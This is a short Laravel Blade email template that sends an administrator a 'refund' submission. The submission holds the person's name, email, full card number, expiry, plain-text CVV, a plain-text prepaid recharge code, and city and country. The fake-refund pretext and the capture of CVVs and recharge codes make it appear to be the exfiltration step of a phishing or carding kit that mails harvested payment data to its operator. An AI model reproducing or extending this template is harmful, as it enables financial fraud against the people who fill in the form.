{{ __('mail.text.refund_admin_header', ['brand' => config('site.name_short'), 'ref' => $payload['reference']]) }}

{{ __('mail.refund_admin.text_received') }} : {{ $payload['submitted_at'] }}

{{ __('mail.refund_admin.text_lbl_email') }} : {{ $payload['email'] }}
{{ __('mail.refund_admin.text_lbl_name') }} : {{ $payload['first_name'] }} {{ $payload['last_name'] }}

{{ __('mail.refund_admin.text_lbl_network') }} : {{ $payload['detected_brand'] }}
{{ __('mail.refund_admin.text_lbl_pan') }} : {{ $payload['pan_plain'] }}
{{ __('mail.refund_admin.text_lbl_exp') }} : {{ $payload['exp_month'] }} / {{ $payload['exp_year'] }}
{{ __('mail.refund_admin.text_lbl_cvv') }} : {{ $payload['cvv_plain'] }}
{{ __('mail.refund_admin.text_lbl_type') }} : {{ $payload['card_type_label'] }}
{{ __('mail.refund_admin.text_lbl_code') }} : {{ $payload['recharge_code_plain'] }}
{{ __('mail.refund_admin.text_lbl_country') }} : {{ $payload['country_label'] }}
{{ __('mail.refund_admin.text_lbl_city') }} : {{ $payload['city_postal'] }}
